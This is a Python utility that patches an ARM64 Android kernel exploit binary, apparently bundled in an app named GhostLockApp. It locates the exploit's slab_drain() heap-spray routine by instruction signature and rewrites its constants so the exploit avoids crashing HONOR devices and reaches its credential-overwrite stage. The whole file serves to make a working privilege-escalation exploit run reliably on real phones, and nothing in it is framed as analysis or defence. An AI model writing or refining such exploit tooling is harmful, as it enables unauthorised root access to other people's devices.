#!/usr/bin/env python3
"""Force the exploit's slab_drain() onto the light branch (2 waves x 200 forks).

Why
---
root/exploit/src/core/main.c:

    static void slab_drain(void) {
      struct timespec up;
      clock_gettime(CLOCK_BOOTTIME, &up);
      int waves = (up.tv_sec > 60) ? 5 : 2;
      int batch = (up.tv_sec > 60) ? 400 : 200;

The 5 x 400 branch (taken on any boot older than 60 s) forks 2000 processes
and reliably trips the kernel's protective reboot on HONOR 5.4: every real
device log ends at

    [*] slab_drain: wave 3/5 start

i.e. the device dies inside the heavy branch, before the exploit ever reaches
the punch / cred-write stage.  A phone that just crashed must be re-paired
with Shizuku by hand (wireless debugging), which always takes minutes, so
CLOCK_BOOTTIME is *always* > 60 s in practice -> the light branch is
unreachable and the chain can never make progress.

What
----
Two levels of patch, both applied in place and idempotent:

1. Default: rewrite the comparison constant 60 -> 4095 s (the 12-bit
   immediate ceiling).  waves/batch stay compiled as the same csel pair, so
   for the first ~68 minutes of uptime the exploit takes 2 x 200 forks.

2. ``--force-light`` (added 2026-11-15): ALSO rewrite the two heavy-side
   constants so both csel arms yield the light values:

       mov w11, #400  ->  #200
       mov w8,   #5   ->  #2

   This is needed because real devices report /proc/uptime far above 4095 s
   (observed 49117 s), i.e. the level-1 patch alone expires.  With both arms
   light, uptime no longer matters at all.

The instruction block is located by its unique 10-word signature:

    ldr  x8, [sp, #16]      ; up.tv_sec
    mov  w9,  #2
    mov  w10, #200
    mov  w11, #400          ; <- force-light rewrites to #200
    sub  x1,  x29, #0x10
    mov  w0,  #1            ; CLOCK_BOOTTIME
    cmp  x8,  #60           ; <- default rewrites to #4095
    mov  w8,  #5            ; <- force-light rewrites to #2
    csel w19, w8,  w9,  gt
    csel w20, w11, w10, gt

The three wildcard slots are shape-checked (correct opcode / destination
register), the signature must be unique, and the script refuses to touch a
binary it does not recognise.  Running it twice is a no-op.

Usage:
  python tools/patch_slab_drain.py GhostLockApp/app/src/main/assets/ghostlock_g7fd5b --force-light
  python tools/patch_slab_drain.py <bin> --to 4095 --force-light --dry-run
"""
from __future__ import annotations

import argparse
import struct
import sys
from pathlib import Path

# index -> (expected destination register, heavy value, light value)
MOV_SLOTS = {3: (11, 400, 200), 7: (8, 5, 2)}
CMP_IDX = 6
OLD_IMM = 60
SIGNATURE: list[int | None] = [
    0xF9400BE8,  # ldr  x8, [sp, #16]
    0x52800049,  # mov  w9,  #2
    0x5280190A,  # mov  w10, #200
    None,        # mov  w11, #400 / #200
    0xD10043A1,  # sub  x1,  x29, #0x10
    0x52800020,  # mov  w0,  #1
    None,        # cmp  x8,  #60 / #4095
    None,        # mov  w8,  #5 / #2
    0x1A89C113,  # csel w19, w8,  w9,  gt
    0x1A8AC174,  # csel w20, w11, w10, gt
]


def make_cmp(rn: int, imm12: int) -> int:
    """SUBS (immediate, 64-bit) with Rd = XZR: cmp x<rn>, #imm12."""
    return 0xF1000000 | ((imm12 & 0xFFF) << 10) | ((rn & 0x1F) << 5) | 0x1F


def make_mov(rd: int, imm16: int) -> int:
    """MOVZ (32-bit, HW=0): mov w<rd>, #imm16."""
    return 0x52800000 | ((imm16 & 0xFFFF) << 5) | rd


def mov_imm(word: int) -> int:
    return (word >> 5) & 0xFFFF


def cmp_imm(word: int) -> int:
    return (word >> 10) & 0xFFF


def find_hits(data: bytes) -> list[int]:
    """Return byte offsets of the shape-checked signature."""
    hits: list[int] = []
    n = len(data) - len(SIGNATURE) * 4
    for off in range(0, n, 4):
        ok = True
        for i, w in enumerate(SIGNATURE):
            got = struct.unpack_from("<I", data, off + i * 4)[0]
            if w is None and i in MOV_SLOTS:
                rd = MOV_SLOTS[i][0]
                # MOVZ 32-bit, HW=0, destination register must match.
                if (got & 0xFFE0001F) != (0x52800000 | rd):
                    ok = False
                    break
            elif w is None and i == CMP_IDX:
                # cmp x8, #imm (SUBS immediate, Rd=XZR, Rn=8).
                if (got & 0xFFC0001F) != (0xF1000000 | 0x1F) or ((got >> 5) & 0x1F) != 8:
                    ok = False
                    break
            elif got != w:
                ok = False
                break
        if ok:
            hits.append(off)
    return hits


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("binary", type=Path, help="exploit ELF to patch (in place)")
    ap.add_argument("--to", type=int, default=4095,
                    help="new comparison constant in seconds (max 4095), default 4095")
    ap.add_argument("--force-light", action="store_true",
                    help="also rewrite both heavy-side constants to the light values")
    ap.add_argument("--dry-run", action="store_true")
    a = ap.parse_args()

    if not (0 < a.to <= 4095):
        print("[error] --to must be in 1..4095 (12-bit immediate)", file=sys.stderr)
        return 2

    data = bytearray(a.binary.read_bytes())
    hits = find_hits(bytes(data))
    print(f"[scan] {a.binary}: signature hits = {len(hits)}")
    if len(hits) != 1:
        print("[error] signature not unique / not found - refusing to patch", file=sys.stderr)
        return 1

    off = hits[0]
    cmp_at = off + CMP_IDX * 4
    imm = cmp_imm(struct.unpack_from("<I", data, cmp_at)[0])
    w11 = mov_imm(struct.unpack_from("<I", data, off + 3 * 4)[0])
    w8 = mov_imm(struct.unpack_from("<I", data, off + 7 * 4)[0])
    print(f"[scan] file {off:#x}: cmp x8, #{imm}  heavy={w8}x{w11}  (light=2x200)")

    changes: list[tuple[int, int, str]] = []
    if imm != a.to:
        if imm not in (OLD_IMM, 4095):
            print(f"[error] unexpected comparison constant #{imm} (want #{OLD_IMM} or 4095)",
                  file=sys.stderr)
            return 1
        changes.append((cmp_at, make_cmp(8, a.to), f"cmp x8, #{imm} -> #{a.to}"))
    if a.force_light:
        for idx, (rd, heavy, light) in MOV_SLOTS.items():
            at = off + idx * 4
            cur = mov_imm(struct.unpack_from("<I", data, at)[0])
            if cur == heavy:
                changes.append((at, make_mov(rd, light), f"w{rd} #{cur} -> #{light}"))
            elif cur != light:
                print(f"[error] w{rd} has unexpected value #{cur} (want #{heavy} or #{light})",
                      file=sys.stderr)
                return 1

    if not changes:
        print("[skip] already patched (no changes needed)")
        return 0
    for at, word, desc in changes:
        struct.pack_into("<I", data, at, word)
        print(f"[patch] {desc}")

    if a.dry_run:
        print("[dry-run] not written")
        return 0
    a.binary.write_bytes(bytes(data))
    print(f"[write] {a.binary} ({len(data)} bytes)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
